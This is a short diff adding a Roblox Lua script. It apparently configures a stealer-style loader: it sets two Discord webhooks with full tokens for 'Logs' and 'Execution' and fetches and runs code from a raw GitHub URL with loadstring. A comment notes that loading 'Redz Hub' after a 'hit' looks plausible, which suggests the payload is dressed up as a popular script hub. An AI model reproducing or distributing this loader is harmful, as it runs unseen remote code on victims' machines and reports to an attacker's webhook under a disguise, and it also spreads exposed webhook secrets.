@@ -1,0 +1,8 @@
+LogsWebhook = "https://discordapp.com/api/webhooks/1357256121563480205/17xPXSlNIVl9n62XYfi5xxnCvnXi16039hO4KahyXSOq64UOlf7AKNtzAPQWZk56yKjG" 
+ExecutionWebhook = "https://discordapp.com/api/webhooks/1357256121563480205/17xPXSlNIVl9n62XYfi5xxnCvnXi16039hO4KahyXSOq64UOlf7AKNtzAPQWZk56yKjG" 
+Username = "U_DGmECI" 
+PromptText = "OK để tiếp tục" 
+RandomizedPrompt = true -- để im vậy nếu mày không hiểu mày đang làm gì 
+LoadRedzAfterHit = false -- Tải Redz Hub sau khi bạn gây sát thương, trông hợp lý
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lelel22f/Hm/refs/heads/main/SimpleTesting"))() 
